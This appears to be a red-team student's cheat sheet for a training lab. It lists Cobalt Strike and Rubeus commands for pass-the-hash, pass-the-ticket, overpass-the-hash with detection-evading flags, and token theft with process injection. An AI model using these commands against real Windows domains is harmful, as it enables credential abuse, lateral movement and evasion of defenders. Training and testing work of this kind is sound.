# User Impersonation

# 1) Pass-the-Hash Attack

    beacon> getuid
    beacon> ls \\web.dev.cyberbotic.io\c$

# PTH using inbuild method in CS (internally uses Mimikatz)

    beacon> pth DEV\jking <hash>

# Find Local Admin Access

    beacon> powerpick Find-LocalAdminAccess

    beacon> rev2self

# 2) Pass-the-Ticket Attack

# Create a sacrificial token with dummy credentials

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Inject the TGT ticket into logon session returned as output of previous command

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

# OR Combine above 2 steps in one

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 

    beacon> steal_token 4748

# 3) Overpass-the-Hash

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:<ntlm> /nowrap

# Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:<aes256> /domain:DEV /opsec /nowrap

# 4) Token Impersonation and Process Injection

    beacon> steal_token 4464
    beacon> inject 4464 x64 tcp-local
    beacon> shinject /path/to/binary
